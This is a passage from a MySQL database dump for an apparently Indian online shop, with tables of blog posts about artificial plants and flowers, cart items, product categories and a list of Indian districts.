(12, 'Croton Plant - Artificial Silk Plant and Tree Range', 'missouri-botanical-garden', 'This striking Croton Plant (Codiaeum variegatum) with vibrant foliage would make a charming addition to the home or workplace.', 'assets/blogposts/blogposts14412619171.jpg', '<p style=\"text-align:justify\">This striking Croton Plant (Codiaeum variegatum) with vibrant foliage would make a charming addition to the home or workplace.Made using the finest materials and the most advanced manufacturing techniques, the blended silk plant is botanically accurate and UV resistant.For optimum realistic presentation the plant will require some branch and foliage shaping.The plant is supplied in a standard plastic pot, so it is ideal for replanting in a pot of your choice.</p>\n\n<p style=\"text-align:justify\">Please note the Portofino planter and river stones shown are for display purposes only and can be purchased separately.&nbsp;</p>\n\n<p style=\"text-align:justify\"><strong>Plant has Limited Outdoor Use</strong> :This plant can be placed outside; however, it will need to be located in a relatively sheltered area.This area must protect the plant from extreme weather conditions such as strong winds and frost as persistent exposure could lead to damage.&nbsp;</p>\n\n<p style=\"text-align:justify\">In addition to being relatively sheltered, the area must also be well ventilated, allowing the plant to dry out should it get wet.&nbsp;</p>\n\n<p style=\"text-align:justify\"><strong>About Closer to Nature&nbsp;</strong></p>\n\n<p style=\"text-align:justify\">We offer a range of superior artificial trees, plants, silk flowers, topiaries, artificial fruit, plug plants and hanging baskets as well as a selection of planters.&nbsp;</p>\n\n<p style=\"text-align:justify\">To provide you with the very best artificial plants made to the highest level of botanical accuracy we use the finest materials and the most advanced manufacturing techniques.</p>\n', '2015-08-24 11:59:10', '2015-09-24 17:12:37', 0, 1, 'ArtiiPlant'),
(11, 'Dahlia Beauty Mix Finest', 'narendra-modi', 'A prolific bedding Dahlia delivering compact dwarf plants not exceeding 20\" tall with stunning flowers across the spectrum of colours', 'assets/blogposts/blogposts14412625771.jpg', '<p>A prolific bedding Dahlia delivering compact dwarf plants not exceeding 20&quot; tall with stunning flowers across the spectrum of colours. Easy to grow and will flower into late autumn. In milder areas will form tubers and re-appear the following year.</p>\n', '2015-08-21 18:13:41', '2015-09-03 12:12:57', 1, 1, 'ArtiiPlant'),
(8, 'Little Flower School', 'test', 'If you can\'t make it to Brooklyn for one of their three-hour workshops, you can do your own study at Little Flower School\'s blog. The site features previews of flowers to be discussed in upcoming courses (plus photos from previous ones).', 'assets/blogposts/blogposts14403985151.jpg', '<p>If you can&#39;t make it to Brooklyn for one of their three-hour workshops, you can do your own study at Little Flower School&#39;s blog. The site features previews of flowers to be discussed in upcoming courses (plus photos from previous ones). Recent courses include: a study in blue flowers, the peony, and fragrant varieties. You won&#39;t get the step-by-step instruction (or the refreshments) online, but you&#39;ll find plenty of ideas to show your florist on your next visit.</p>\n', '2015-08-10 15:10:25', '2015-08-24 12:11:55', 1, 1, 'Harsha'),
(9, 'Flores del Sol', 'test-2', 'Fresh from the Garden State, flower aficionado Christina Moreno is part horticulture expert, part floral designer. Her extensive knowledge of the botanical world is evident, from musings on her own botanical finds, to interesting and timely tidbits like the history of the royal wedding bouquet.', 'assets/blogposts/blogposts14401346721.png', '<p>Fresh from the Garden State, flower aficionado Christina Moreno is part horticulture expert, part floral designer. Her extensive knowledge of the botanical world is evident, from musings on her own botanical finds, to interesting and timely tidbits like the history of the royal wedding bouquet. Drawing on her love of all things vintage, Moreno also creates surprisingly modern arrangements made of dried flowers and moss in her Etsy shop.</p>\n', '2015-08-10 15:10:25', '2015-08-24 11:55:06', 1, 1, 'Hareesh'),
(10, 'Floral Evolution', 'test-1', 'For a site that pulls together photos of floral inspirations and arrangements from all over the Web, we couldn\'t think of a more appropriate url than theirs: flowersarewhatido.tumblr.com is pretty spot-on.', 'assets/blogposts/blogposts14403984961.jpg', '<p>For a site that pulls together photos of floral inspirations and arrangements from all over the Web, we couldn&#39;t think of a more appropriate url than theirs: flowersarewhatido.tumblr.com is pretty spot-on. Photos speak for themselves on this minimalist Tumblr feed&mdash;you won&#39;t find many words, but you can still search for, say, &quot;tulips&quot; or &quot;roses&quot; if you&#39;re looking for inspiration of a particular variety.</p>\n', '2015-08-10 15:10:25', '2015-08-24 12:11:36', 1, 1, 'Ajith Rao'),
(13, 'Closer To Nature Artificial Taro Plant', 'wedding-wednesday-bouquets-with-succulents', 'This lovely Taro plant has large vibrant leaves and is ideal for both under planting with other plants or trees and as a fantastic stand-alone feature for any room. The plant would make a beautiful addition to the home or workplace.', 'assets/blogposts/blogposts14412616911.jpg', '<p style=\"text-align: justify;\">This lovely Taro plant has large vibrant leaves and is ideal for both under planting with other plants or trees and as a fantastic stand-alone feature for any room. The plant would make a beautiful addition to the home or workplace.</p>\n\n<p style=\"text-align: justify;\">It is made using the finest materials and the most advanced manufacturing techniques to ensure botanical accuracy and close-up detail. Another great feature is that the plant is UV resistant, so it will not fade in the sunlight.</p>\n\n<p style=\"text-align: justify;\">For optimum presentation the plant will require minimal branch and foliage shaping.</p>\n\n<p style=\"text-align: justify;\">It is supplied in a standard terracotta coloured plastic pot, so it is ideal for replanting in a pot of your choice. Please note the pot shown is for display purposes only and can be purchased separately.</p>\n\n<p style=\"text-align: justify;\"><strong>The plant has limited outdoor use - Please note the following definition:&nbsp;</strong></p>\n\n<p style=\"text-align: justify;\">Plants in this category are UV protected but if placed outside will need to be located in a relatively sheltered area. Specifically plants of this type will need to be kept away from extreme conditions such as strong winds or frost as persistent exposure could lead to their foliage being damaged. It is important to note that all plants placed outside should be located in a well-ventilated area, allowing them to dry out if they get wet.</p>\n\n<p style=\"text-align: justify;\"><strong>About Closer To Nature&nbsp;</strong></p>\n\n<p style=\"text-align: justify;\">We offer a range of superior artificial plants, trees, silk flowers, topiaries, artificial fruit, garlands and trails as well as a selection of planters. We use the most advanced manufacturing techniques to offer you the very best artificial plants with botanical accuracy.</p>\n', '2015-08-24 12:02:30', '2015-09-24 17:11:03', 0, 1, 'ArtiiPlant'),
(14, 'Roses are close to Heart!!!', 'february-full-3-day-workshop-retreat-in-california-ca-location-tba', 'The rose is the most deeply ingrained flower in human history and human culture. It has been immortalized and integrated into music, festivals, poetry and even wars.', 'assets/blogposts/blogposts14412612791.jpg', '<p>The rose is the most deeply ingrained flower in human history and human culture. It has been immortalized and integrated into music, festivals, poetry and even wars. It has been used as a symbol of passion as well as grief.</p>\n\n<p>It is the sign of human love, given on such occasions as the annual remembrance of Mother&#39;s Day. Roses are naturally found throughout the Northern Hemisphere, and fossil records show&nbsp;</p>\n', '2015-08-24 12:04:03', '2015-09-03 12:06:26', 1, 1, 'ArtiiPlant'),
(15, 'Sunflower Flower Sunshine', 'new-workshop-dates-and-locations', 'These bright, big-faced flowers are one of the most loved flowers of all. The Sunflower is known to move its head alongwith the changing direction of the Sun', 'assets/blogposts/blogposts14412594791.jpg', '<p style=\"text-align: justify;\">These bright, big-faced flowers are one of the most loved flowers of all. The Sunflower is known to move its head alongwith the changing direction of the Sun. But with this artificial sunflower, you need not change its direction :)</p>\n\n<p style=\"text-align: justify;\">Plus, there&#39;s no need to water it daily nor does it require much maintenance! Ginnibloom&#39;s artificial Sunflower looks so real, you&#39;ll have to touch them to know the difference! Place this Artificial Sunflower anywhere and it immediately brightens up the surroundings. Gift it to a loved one and brighten his/her day! It&#39;s also perfect to fill that glass vase which is lying empty since a long time :)</p>\n', '2015-08-24 12:05:52', '2015-09-24 17:10:43', 0, 1, 'Artiiplant'),
(16, 'Tulips', 'babies-flowers-the-future-of-ccfd', 'Long live the tulip! We can buy tulip bulbs in virtually all colors, including a purple so deep that it looks black. And by planting a selection of varieties of this perennial, we can enjoy their beauty from early spring through early summer.', 'assets/blogposts/blogposts14412627161.jpg', '<p style=\"text-align: justify;\">Long live the tulip! We can buy tulip bulbs in virtually all colors, including a purple so deep that it looks black. And by planting a selection of varieties of this perennial, we can enjoy their beauty from early spring through early summer.</p>\n\n<p style=\"text-align: justify;\">Tulips do best in areas with dry summers and cold winters. The brightly colored, upright flowers may be single or double, and vary in shape from simple cups, bowls, and goblets to more complex forms. They are excellent in beds and borders; many types are good for forcing into bloom indoors, and most are excellent for cut flowers.</p>\n\n<p style=\"text-align: justify;\">Although tulips are a perennial, many gardeners treat them as annuals, to be planted anew each year. The North American climate and soil can&#39;t replicate the ancient Anatolian and southern Russian conditions of their birth. Gardeners in our western mountain regions come closest to this climate.</p>\n', '2015-08-24 12:07:21', '2015-09-04 16:17:22', 1, 1, 'ArtiiPlant'),
(17, 'Behind The Scenes At CCFD W/ AMY CAROLINE', 'behind-the-scenes-at-ccfd-w-amy-caroline', 'Floral Design is hard work. Like physical, tiring, on-your-feet-all-day, floral-glue-stuck-to-your-hands hard work. I once had an employee who soaked in a hot, sudsy bath after a long day of floral design and I don\'t blame her one bit.', 'assets/blogposts/blogposts15472032411.jpg', '<p style=\"text-align:justify\">Floral Design is hard work. Like physical, tiring, on-your-feet-all-day, floral-glue-stuck-to-your-hands hard work. I once had an employee who soaked in a hot, sudsy bath after a long day of floral design and I don&#39;t blame her one bit. So often we only show the end result of all that work, when our arrangements are perfectly placed (ahem, staged for a photo) on gorgeously coordinated linens among perfectly styled props. So it&#39;s always fun to show what happens behind the scenes at our studio Wednesday-Saturday during wedding season. The reality is FLOWER EXPLOSION. Flowers everywhere and a beautifully coordinated chaos of design happening. It really is so thrilling. Here&#39;s a little look into our world on a design day. We left the bucket cleaning, wax removing, and vase prep out for asthetic reasons - ha! Oh, and you may see a sweet little miss who happened to join us for this day. I figured you wouldn&#39;t mind! Thanks, Amy Caroline, for so beautifully documenting this day!!! To see more, check out her blog and some tips on why we think flowers should be a high priority in your wedding budget (DUH!)</p>\n', '2015-08-24 12:08:38', '2019-01-11 16:10:41', 1, 1, 'Vanishree');

-- --------------------------------------------------------

--
-- Table structure for table `blogposts_post_kushal`
--

CREATE TABLE `blogposts_post_kushal` (
  `id` int(11) NOT NULL,
  `title` text NOT NULL,
  `page_url` text NOT NULL,
  `breif_descp` text NOT NULL,
  `image_path` text NOT NULL,
  `descp` text NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `status` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `post_by` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `blogposts_post_kushal`
--

INSERT INTO `blogposts_post_kushal` (`id`, `title`, `page_url`, `breif_descp`, `image_path`, `descp`, `created_date`, `modified_date`, `status`, `user_id`, `post_by`) VALUES
(12, 'Croton Plant - Artificial Silk Plant and Tree Range', 'missouri-botanical-garden', 'This striking Croton Plant (Codiaeum variegatum) with vibrant foliage would make a charming addition to the home or workplace.', 'assets/blogposts/blogposts14412619171.jpg', '<p style=\"text-align:justify\">This striking Croton Plant (Codiaeum variegatum) with vibrant foliage would make a charming addition to the home or workplace.Made using the finest materials and the most advanced manufacturing techniques, the blended silk plant is botanically accurate and UV resistant.For optimum realistic presentation the plant will require some branch and foliage shaping.The plant is supplied in a standard plastic pot, so it is ideal for replanting in a pot of your choice.</p>\n\n<p style=\"text-align:justify\">Please note the Portofino planter and river stones shown are for display purposes only and can be purchased separately.&nbsp;</p>\n\n<p style=\"text-align:justify\"><strong>Plant has Limited Outdoor Use</strong> :This plant can be placed outside; however, it will need to be located in a relatively sheltered area.This area must protect the plant from extreme weather conditions such as strong winds and frost as persistent exposure could lead to damage.&nbsp;</p>\n\n<p style=\"text-align:justify\">In addition to being relatively sheltered, the area must also be well ventilated, allowing the plant to dry out should it get wet.&nbsp;</p>\n\n<p style=\"text-align:justify\"><strong>About Closer to Nature&nbsp;</strong></p>\n\n<p style=\"text-align:justify\">We offer a range of superior artificial trees, plants, silk flowers, topiaries, artificial fruit, plug plants and hanging baskets as well as a selection of planters.&nbsp;</p>\n\n<p style=\"text-align:justify\">To provide you with the very best artificial plants made to the highest level of botanical accuracy we use the finest materials and the most advanced manufacturing techniques.</p>\n', '2015-08-24 11:59:10', '2015-10-19 15:04:44', 0, 1, 'Kusal Indoor Garden'),
(13, 'Closer To Nature Artificial Taro Plant', 'wedding-wednesday-bouquets-with-succulents', 'This lovely Taro plant has large vibrant leaves and is ideal for both under planting with other plants or trees and as a fantastic stand-alone feature for any room. The plant would make a beautiful addition to the home or workplace.', 'assets/blogposts/blogposts14412616911.jpg', '<p style=\"text-align:justify\">This lovely Taro plant has large vibrant leaves and is ideal for both under planting with other plants or trees and as a fantastic stand-alone feature for any room. The plant would make a beautiful addition to the home or workplace.</p>\n\n<p style=\"text-align:justify\">It is made using the finest materials and the most advanced manufacturing techniques to ensure botanical accuracy and close-up detail. Another great feature is that the plant is UV resistant, so it will not fade in the sunlight.</p>\n\n<p style=\"text-align:justify\">For optimum presentation the plant will require minimal branch and foliage shaping.</p>\n\n<p style=\"text-align:justify\">It is supplied in a standard terracotta coloured plastic pot, so it is ideal for replanting in a pot of your choice. Please note the pot shown is for display purposes only and can be purchased separately.</p>\n\n<p style=\"text-align:justify\"><strong>The plant has limited outdoor use - Please note the following definition:&nbsp;</strong></p>\n\n<p style=\"text-align:justify\">Plants in this category are UV protected but if placed outside will need to be located in a relatively sheltered area. Specifically plants of this type will need to be kept away from extreme conditions such as strong winds or frost as persistent exposure could lead to their foliage being damaged. It is important to note that all plants placed outside should be located in a well-ventilated area, allowing them to dry out if they get wet.</p>\n\n<p style=\"text-align:justify\"><strong>About Closer To Nature&nbsp;</strong></p>\n\n<p style=\"text-align:justify\">We offer a range of superior artificial plants, trees, silk flowers, topiaries, artificial fruit, garlands and trails as well as a selection of planters. We use the most advanced manufacturing techniques to offer you the very best artificial plants with botanical accuracy.</p>\n', '2015-08-24 12:02:30', '2015-10-19 15:04:29', 0, 1, 'Kusal Indoor Garden'),
(15, 'Sunflower Flower Sunshine', 'new-workshop-dates-and-locations', 'These bright, big-faced flowers are one of the most loved flowers of all. The Sunflower is known to move its head alongwith the changing direction of the Sun', 'assets/blogposts/blogposts14412594791.jpg', '<p style=\"text-align:justify\">These bright, big-faced flowers are one of the most loved flowers of all. The Sunflower is known to move its head alongwith the changing direction of the Sun. But with this artificial sunflower, you need not change its direction :)</p>\n\n<p style=\"text-align:justify\">Plus, there&#39;s no need to water it daily nor does it require much maintenance! Ginnibloom&#39;s artificial Sunflower looks so real, you&#39;ll have to touch them to know the difference! Place this Artificial Sunflower anywhere and it immediately brightens up the surroundings. Gift it to a loved one and brighten his/her day! It&#39;s also perfect to fill that glass vase which is lying empty since a long time :)</p>\n', '2015-08-24 12:05:52', '2015-10-19 15:05:23', 0, 1, 'Kusal Indoor Garden');

-- --------------------------------------------------------

--
-- Table structure for table `brochure`
--

CREATE TABLE `brochure` (
  `id` int(11) NOT NULL,
  `brochure_pdf` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `brochure`
--

INSERT INTO `brochure` (`id`, `brochure_pdf`) VALUES
(1, 'assets/brochure/about16427437831.pdf');

-- --------------------------------------------------------

--
-- Table structure for table `cart_products`
--

CREATE TABLE `cart_products` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `prodsize_id` int(11) NOT NULL,
  `qty` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `cart_products`
--

INSERT INTO `cart_products` (`id`, `user_id`, `prodsize_id`, `qty`, `created_date`, `modified_date`) VALUES
(31, 34, 25, 1, '2021-05-31 19:02:21', '2021-05-31 19:02:21'),
(50, 35, 100, 1, '2021-06-01 08:30:05', '2021-06-01 08:35:45'),
(51, 35, 123, 1, '2021-06-01 08:35:45', '2021-06-01 08:35:45'),
(53, 38, 35, 1, '2021-06-01 13:12:35', '2021-06-01 13:28:49'),
(54, 38, 54, 25, '2021-06-01 13:13:01', '2021-06-01 13:28:49'),
(55, 38, 32, 25, '2021-06-01 13:26:57', '2021-06-01 13:28:49'),
(81, 43, 23, 50, '2021-06-02 15:53:21', '2021-06-02 15:53:21'),
(88, 45, 34, 5, '2021-06-07 14:18:32', '2021-06-07 14:18:32'),
(90, 46, 3, 1, '2021-06-07 14:49:27', '2021-06-07 14:49:27'),
(91, 47, 55, 25, '2021-06-07 14:54:50', '2021-06-07 14:54:50'),
(111, 1, 34, 3, '2021-07-30 17:19:34', '2021-07-30 17:19:34'),
(117, 53, 24, 1, '2021-10-27 11:12:00', '2021-10-27 11:12:00'),
(126, 10, 8, 4, '2021-10-28 16:53:28', '2021-10-28 16:53:28'),
(127, 55, 24, 2, '2021-11-01 14:33:04', '2021-11-01 14:33:04'),
(128, 1, 43, 3, '2021-11-18 12:08:34', '2021-11-18 12:08:34'),
(129, 57, 21, 1, '2021-11-20 05:29:48', '2021-11-20 05:29:51'),
(130, 57, 27, 1, '2021-11-20 05:29:49', '2021-11-20 05:29:51'),
(131, 58, 10, 1, '2021-12-08 10:24:10', '2021-12-08 11:36:51'),
(133, 58, 8, 1, '2021-12-08 10:28:42', '2021-12-08 11:36:51'),
(134, 61, 9, 1, '2021-12-09 06:59:31', '2021-12-09 06:59:31'),
(141, 62, 130, 1, '2021-12-09 08:32:02', '2021-12-09 12:14:53'),
(147, 64, 145, 2, '2021-12-18 11:20:27', '2021-12-18 11:20:27'),
(148, 64, 152, 2, '2021-12-20 04:55:38', '2021-12-20 04:55:38'),
(149, 64, 138, 2, '2021-12-20 09:12:04', '2021-12-20 09:12:04'),
(150, 65, 144, 1, '2021-12-21 05:27:03', '2021-12-21 05:27:03'),
(155, 66, 141, 1, '2021-12-21 06:41:14', '2021-12-21 06:41:16'),
(172, 63, 144, 1, '2021-12-22 11:43:34', '2022-01-10 09:11:26'),
(173, 63, 152, 1, '2021-12-22 11:44:15', '2022-01-05 10:51:38'),
(174, 63, 153, 1, '2021-12-22 11:44:17', '2021-12-27 11:42:39'),
(175, 63, 142, 1, '2021-12-22 11:44:56', '2022-01-05 14:46:51'),
(176, 63, 143, 1, '2021-12-22 11:47:03', '2021-12-30 10:05:46'),
(177, 63, 140, 1, '2021-12-22 11:47:10', '2021-12-30 10:05:46'),
(178, 63, 141, 1, '2021-12-22 11:55:50', '2022-01-10 08:08:52'),
(179, 63, 138, 1, '2021-12-22 11:57:04', '2022-01-10 05:52:24'),
(180, 63, 145, 4, '2021-12-22 12:00:11', '2022-01-10 15:49:27'),
(181, 63, 146, 1, '2021-12-23 05:30:27', '2022-01-04 11:57:12'),
(182, 63, 155, 1, '2021-12-23 05:30:31', '2022-01-04 11:15:27'),
(183, 63, 149, 1, '2021-12-27 14:50:56', '2022-01-06 06:59:34'),
(184, 63, 150, 1, '2021-12-27 14:50:58', '2022-01-09 09:20:02'),
(185, 63, 154, 1, '2021-12-28 03:39:52', '2022-01-04 11:15:27'),
(186, 73, 145, 1, '2021-12-30 04:44:36', '2021-12-30 04:44:36'),
(187, 63, 158, 1, '2022-01-10 08:08:52', '2022-01-11 09:21:38'),
(188, 63, 159, 1, '2022-01-10 12:34:42', '2022-01-24 09:15:32'),
(189, 63, 160, 1, '2022-01-10 15:49:27', '2022-01-24 09:15:32'),
(190, 76, 160, 1, '2022-01-11 06:56:29', '2022-01-11 06:56:29'),
(191, 63, 166, 1, '2022-01-11 07:10:33', '2022-01-24 09:15:32'),
(192, 63, 161, 1, '2022-01-11 07:13:39', '2022-01-24 09:15:32'),
(193, 79, 160, 1, '2022-01-12 11:11:57', '2022-01-12 11:11:57'),
(194, 84, 166, 1, '2022-01-13 03:55:50', '2022-01-25 10:34:05'),
(195, 73, 161, 1, '2022-01-13 05:20:16', '2022-01-19 04:36:38'),
(196, 73, 160, 1, '2022-01-13 05:20:20', '2022-01-19 04:36:38'),
(197, 73, 166, 1, '2022-01-13 05:20:21', '2022-01-19 04:36:38'),
(198, 84, 160, 1, '2022-01-13 05:30:28', '2022-01-24 15:27:22'),
(199, 84, 161, 1, '2022-01-13 05:30:52', '2022-01-25 10:26:03'),
(200, 84, 159, 1, '2022-01-13 06:30:30', '2022-01-25 11:01:03'),
(201, 86, 159, 1, '2022-01-15 05:02:53', '2022-01-15 05:02:56'),
(202, 86, 160, 1, '2022-01-15 05:02:55', '2022-01-15 05:02:56'),
(203, 86, 161, 1, '2022-01-15 05:02:56', '2022-01-15 05:02:56'),
(204, 73, 159, 1, '2022-01-15 06:40:27', '2022-01-15 06:40:27'),
(205, 87, 160, 1, '2022-01-17 05:10:56', '2022-01-17 05:11:12'),
(206, 87, 166, 1, '2022-01-17 05:11:12', '2022-01-17 05:39:23'),
(207, 87, 161, 1, '2022-01-17 05:39:23', '2022-01-17 05:39:23'),
(208, 76, 161, 1, '2022-01-20 05:28:36', '2022-01-20 05:28:36'),
(209, 1, 166, 1, '2022-01-25 15:49:45', '2022-01-25 15:56:40'),
(210, 1, 160, 1, '2022-01-25 15:56:39', '2022-01-25 15:56:40'),
(211, 1, 159, 1, '2022-01-25 15:56:40', '2022-01-25 15:56:40');

-- --------------------------------------------------------

--
-- Table structure for table `category`
--

CREATE TABLE `category` (
  `id` int(11) NOT NULL,
  `order_no` int(11) NOT NULL,
  `name` text NOT NULL,
  `page_url` text NOT NULL,
  `limit_cart` int(11) NOT NULL DEFAULT '1',
  `user_id` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `status` int(11) NOT NULL,
  `new_collection` int(11) NOT NULL,
  `description` text NOT NULL,
  `image_path` text NOT NULL,
  `short_form` varchar(200) NOT NULL,
  `type` tinyint(2) NOT NULL COMMENT '1->b2c;2->b2b;0->both',
  `banner_img` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `category`
--

INSERT INTO `category` (`id`, `order_no`, `name`, `page_url`, `limit_cart`, `user_id`, `created_date`, `modified_date`, `status`, `new_collection`, `description`, `image_path`, `short_form`, `type`, `banner_img`) VALUES
(1, 3, 'Exhilarating Medicine', 'cow_product', 1, 1, '2022-01-28 12:01:27', '2022-07-22 06:01:51', 1, 0, '      Exhilarating Medicine      ', 'assets/our_products/cow_product.png', '0', 0, 'assets/our_products/testimonials16202957771.png'),
(2, 2, 'Dairy Products', 'dairy_products', 1, 1, '2022-01-29 11:58:47', '2022-02-22 14:16:44', 1, 0, '           Dairy Products           ', 'assets/our_products/dairy_products.jpg', '0', 0, 'assets/our_products/main-slider-1-2.jpg'),
(4, 4, 'Tablets', 'tablets', 1, 1, '2022-02-15 14:54:26', '2022-07-22 06:02:08', 1, 0, '   Tablets   ', '0', '0', 0, ''),
(5, 5, 'Churnas', 'churnas', 1, 1, '2022-02-15 14:54:49', '2022-07-22 06:04:15', 1, 0, '   Churnas   ', '0', '0', 0, ''),
(6, 6, 'Cosmetics', 'cosmetics', 1, 1, '2022-02-15 14:55:09', '2022-07-22 06:04:28', 1, 0, '   Cosmetics   ', '0', '0', 0, ''),
(7, 7, 'Oils & Ointments', 'oils_ointments', 1, 1, '2022-02-15 14:56:01', '2022-07-22 06:04:38', 1, 0, '     Oils And Ointments     ', '0', '0', 0, ''),
(8, 8, 'Organic Food', 'organic_food', 1, 1, '2022-02-15 14:56:37', '2022-07-22 06:04:48', 1, 0, '   Organic Food   ', '0', '0', 0, ''),
(9, 9, 'Garden & Agriculture', 'garden_agriculture', 1, 1, '2022-02-15 14:57:02', '2022-07-22 06:04:57', 0, 0, '     Garden And Agriculture     ', '0', '0', 0, ''),
(13, 10, 'Organic Products', 'organic_products', 1, 1, '2022-07-27 06:28:36', '2022-07-27 06:28:36', 1, 0, 'Organic Products', '0', '0', 0, ''),
(12, 1, 'Generic Products', 'pooja_items', 1, 1, '2022-03-31 05:11:35', '2022-07-26 09:44:42', 0, 0, ' Generic Products ', '0', '0', 0, '');

-- --------------------------------------------------------

--
-- Table structure for table `cities`
--

CREATE TABLE `cities` (
  `id` int(11) NOT NULL,
  `order_no` int(11) NOT NULL DEFAULT '1',
  `state_id` int(11) NOT NULL,
  `name` text NOT NULL,
  `favourite` int(11) NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `cities`
--

INSERT INTO `cities` (`id`, `order_no`, `state_id`, `name`, `favourite`, `status`) VALUES
(1, 1, 1, 'Kolar', 0, 0),
(2, 1, 1, 'Bengaluru', 1, 0),
(3, 1, 2, 'salem', 0, 0),
(4, 5, 1, 'Kodagu', 0, 0),
(12, 3, 1, 'Mysore', 0, 0),
(17, 1, 1, 'Tumkur', 0, 0),
(18, 1, 12, 'Anantapur', 0, 0),
(19, 1, 12, 'Chittoor', 0, 0),
(20, 1, 12, 'East Godavari', 0, 0),
(21, 1, 12, 'Guntur', 0, 0),
(22, 1, 12, 'Kadapa', 0, 0),
(23, 1, 12, 'Krishna', 0, 0),
(24, 1, 12, 'Kurnool', 0, 0),
(25, 1, 12, 'Nellore', 0, 0),
(26, 1, 12, 'Prakasam', 0, 0),
(27, 1, 12, 'Srikakulam', 0, 0),
(28, 1, 12, 'Tirupathi', 0, 0),
(29, 1, 12, 'Vijaywada', 0, 0),
(30, 1, 12, 'Visakhapatnam', 0, 0),
(31, 1, 12, 'Vizianagaram', 0, 0),
(32, 1, 12, 'West Godavari', 0, 0),
(33, 1, 13, 'Anjaw', 0, 0),
(34, 1, 13, 'Changlang', 0, 0),
(35, 1, 13, 'Dibang Valley', 0, 0),
(36, 1, 13, 'East Kameng', 0, 0),
(37, 1, 13, 'East Siang', 0, 0),
(38, 1, 13, 'Kra Daadi', 0, 0),
(39, 1, 13, 'Kurung Kumey', 0, 0),
(40, 1, 13, 'Lepa Rada', 0, 0),
(41, 1, 13, 'Lohit', 0, 0),
(42, 1, 13, 'Longding', 0, 0),
(43, 1, 13, 'Lower Dibang Valley', 0, 0),
(44, 1, 13, 'Lower Siang', 0, 0),
(45, 1, 13, 'Lower Subansiri', 0, 0),
(46, 1, 13, 'Namsai', 0, 0),
(47, 1, 13, 'Pakke-Kessang', 0, 0),
(48, 1, 13, 'Papum Pare', 0, 0),
(49, 1, 13, 'Shi Yomi', 0, 0),
(50, 1, 13, 'Siang', 0, 0),
(51, 1, 13, 'Tawng', 0, 0),
(52, 1, 13, 'Tirap', 0, 0),
(53, 1, 13, 'Upper Siang', 0, 0),
(54, 1, 13, 'Upper Subansiri', 0, 0),
(55, 1, 13, 'West Kameng', 0, 0),
(56, 1, 13, 'West Siang', 0, 0),
(57, 1, 15, 'Bajali', 0, 0),
(58, 1, 15, 'Baksa', 0, 0),
(59, 1, 15, 'Barpeta', 0, 0),
(60, 1, 15, 'Bishwanath', 0, 0),
(61, 1, 15, 'Bongaigaon', 0, 0),
(62, 1, 15, 'Cachar', 0, 0),
(63, 1, 15, 'Charaideo', 0, 0),
(64, 1, 15, 'Chirang', 0, 0),
(65, 1, 15, 'Darrang', 0, 0),
(66, 1, 15, 'Dhemaji', 0, 0),
(67, 1, 15, 'Dhubri', 0, 0),
(68, 1, 15, 'Dibrugarh', 0, 0),
(69, 1, 15, 'Dima Hasao', 0, 0),
(70, 1, 15, 'Goalpara', 0, 0),
(71, 1, 15, 'Golaghat', 0, 0),
(72, 1, 15, 'Hailakandi', 0, 0),
(73, 1, 15, 'Hojai', 0, 0),
(74, 1, 15, 'Jorhat', 0, 0),
(75, 1, 15, 'Kamrup', 0, 0),
(76, 1, 15, 'Kamrup Metropolitian', 0, 0),
(77, 1, 15, 'Karbi Anglong', 0, 0),
(78, 1, 15, 'Karimganj', 0, 0),
(79, 1, 15, 'kokrajhar', 0, 0),
(80, 1, 15, 'Lakhimpur', 0, 0),
(81, 1, 15, 'Majuli', 0, 0),
(82, 1, 15, 'Morigaon', 0, 0),
(83, 1, 15, 'Nagaon', 0, 0),
(84, 1, 15, 'Nalbari', 0, 0),
(85, 1, 15, 'Sivasagar', 0, 0),
(86, 1, 15, 'Sonitpur', 0, 0),
(87, 1, 15, 'South Salmara', 0, 0),
(88, 1, 15, 'Tinsukia', 0, 0),
(89, 1, 15, 'Udalguri', 0, 0),
(90, 1, 15, 'West Karbi Anglong', 0, 0),
(91, 1, 16, 'Araria', 0, 0),
(92, 1, 16, 'Arwal', 0, 0),
(93, 1, 16, 'Aurangabad', 0, 0),
(94, 1, 16, 'Banka', 0, 0),
(95, 1, 16, 'Begusarai', 0, 0),
(96, 1, 16, 'Bhagalpur', 0, 0),
(97, 1, 16, 'Bhojpur', 0, 0),
(98, 1, 16, 'Buxar', 0, 0),
(99, 1, 16, 'Darbhanga', 0, 0),
(100, 1, 16, 'East Champaran', 0, 0),
(101, 1, 16, 'Gaya', 0, 0),
(102, 1, 16, 'Gopalganj', 0, 0),
(103, 1, 16, 'Jamui', 0, 0),
(104, 1, 16, 'Jenanabad', 0, 0),
(105, 1, 16, 'Kaimur', 0, 0),
(106, 1, 16, 'Katihar', 0, 0),
(107, 1, 16, 'Khagaria', 0, 0),
(108, 1, 16, 'Kishanganj', 0, 0),
(109, 1, 16, 'Lakshisarai', 0, 0),
(110, 1, 16, 'Madhepura', 0, 0),
(111, 1, 16, 'Madhubani', 0, 0),
(112, 1, 16, 'Munger', 0, 0),
(113, 1, 16, 'Muzaffarpur', 0, 0),
(114, 1, 16, 'Nalanda', 0, 0),
(115, 1, 16, 'Nawada', 0, 0),
(116, 1, 16, 'patna', 0, 0),
(117, 1, 16, 'Purnia', 0, 0),
(118, 1, 16, 'Rohtas', 0, 0),
(119, 1, 16, 'Saharsa', 0, 0),
(120, 1, 16, 'Samastipur', 0, 0),
(121, 1, 16, 'Saran', 0, 0),
(122, 1, 16, 'Sheikhpura', 0, 0),
(123, 1, 16, 'Sheohar', 0, 0),
(124, 1, 16, 'Sitamarhi', 0, 0),
(125, 1, 16, 'Siwan', 0, 0),
(126, 1, 16, 'Supaul', 0, 0),
(127, 1, 16, 'Vaishali', 0, 0),
(128, 1, 16, 'West Champaran', 0, 0),
(129, 1, 18, 'Balod', 0, 0),
